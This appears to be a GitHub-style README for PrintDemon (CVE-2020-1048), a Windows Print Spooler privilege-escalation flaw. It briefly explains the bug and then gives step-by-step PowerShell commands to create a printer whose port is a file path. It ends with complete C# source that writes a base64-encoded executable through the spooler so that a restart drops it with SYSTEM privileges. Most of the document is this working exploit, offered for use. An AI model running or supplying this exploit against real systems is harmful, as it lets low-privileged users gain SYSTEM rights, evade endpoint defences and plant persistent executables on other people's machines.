# PrintDemon (CVE-2020-1048)

PrintDemon is a vulnerability that uses the Windows Printer Spooler to escalate privileges, bypass Endpoint Detection & Response (EDR), and gain persistence. The Windows Printer Spooler has a long history of vulnerabilities including a vulnerability (CVE-2010-2729) used by the well-known Malware called Stuxnet back in 2010.

A printer must be associated with two attributes: A printer port and a printer driver. The printer port can be set to 'PORTPROMPT' which makes it possible to print to a file.

The printer driver and printer port can be set as a low-privileged user when using certain PowerShell commands. When you print to the printer it will use the printer port which is set to a file. The print itself does not work, but the trick is that if you restart the spooler service, it impersonates SYSTEM. Since SYSTEM is a high-privileges account, you can drop a file anywhere on the system with a low-privileged user, hence the name privilege-escalation.

There was one problem though. When you print a string to the port, it looks like there is some markup at the beginning of the file. Since the first few bytes of a file is the signature of a file, it can not be untouched if you want to run it in a normal way.

# How-to

Run the following commands in PowerShell and use the tool to drop a file to the printer port location:

```
$printer = "PrintDemon"
$PrinterDriver = "Generic / Text Only"
$printerPort = "C:\Users\thalpius\Downloads\calc.exe"

Add-PrinterDriver -Name $PrinterDriver
Add-Printerport -name $printerPort
Add-Printer -Name $printer -DriverName $PrinterDriver -PortName $printerPort
```
**Note:** Once the print job is sent, restart the spooler service to drop the file with system privileges.

# Source Code
```c#
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

[StructLayout(LayoutKind.Sequential)]
public struct DOCINFO
{
    [MarshalAs(UnmanagedType.LPWStr)]
    public string pDocName;
    [MarshalAs(UnmanagedType.LPWStr)]
    public string pOutputFile;
    [MarshalAs(UnmanagedType.LPWStr)]
    public string pDataType;
}

public class PrintDirect
{
    [DllImport("winspool.drv", CharSet = CharSet.Unicode, ExactSpelling = false, CallingConvention = CallingConvention.StdCall)]
    public static extern long OpenPrinter(string pPrinterName, ref IntPtr phPrinter, int pDefault);

    [DllImport("winspool.drv", CharSet = CharSet.Unicode, ExactSpelling = false, CallingConvention = CallingConvention.StdCall)]
    public static extern long StartDocPrinter(IntPtr hPrinter, int Level, ref DOCINFO pDocInfo);

    [DllImport("winspool.drv", CharSet = CharSet.Unicode, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
    public static extern long StartPagePrinter(IntPtr hPrinter);

    [DllImport("winspool.drv", CharSet = CharSet.Ansi, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
    public static extern long WritePrinter(IntPtr hPrinter, byte[] data, int buf, ref int pcWritten);

    [DllImport("winspool.drv", CharSet = CharSet.Unicode, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
    public static extern long EndPagePrinter(IntPtr hPrinter);

    [DllImport("winspool.drv", CharSet = CharSet.Unicode, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
    public static extern long EndDocPrinter(IntPtr hPrinter);

    [DllImport("winspool.drv", CharSet = CharSet.Unicode, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
    public static extern long ClosePrinter(IntPtr hPrinter);
}

namespace PrintDemon
{
    class Program
    {
        static void Main(string[] args)
        {
            string printerAddress = "PrintDemon";
            string base64 = "TVqQAAMAAAAEAAAA <SNIP> AAA";
            byte[] bytes = System.Convert.FromBase64String(base64);

            IntPtr printer = new IntPtr();
            int pcWritten = 0;
            DOCINFO docInfo = new DOCINFO
            {
                pDataType = "RAW"
            };

            PrintDirect.OpenPrinter(printerAddress, ref printer, 0);
            PrintDirect.StartDocPrinter(printer, 1, ref docInfo);
            PrintDirect.StartPagePrinter(printer);

            try
            {
                PrintDirect.WritePrinter(printer, bytes, bytes.Length, ref pcWritten);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            PrintDirect.EndPagePrinter(printer);
            PrintDirect.EndDocPrinter(printer);
            PrintDirect.ClosePrinter(printer);
        }
    }
}
```
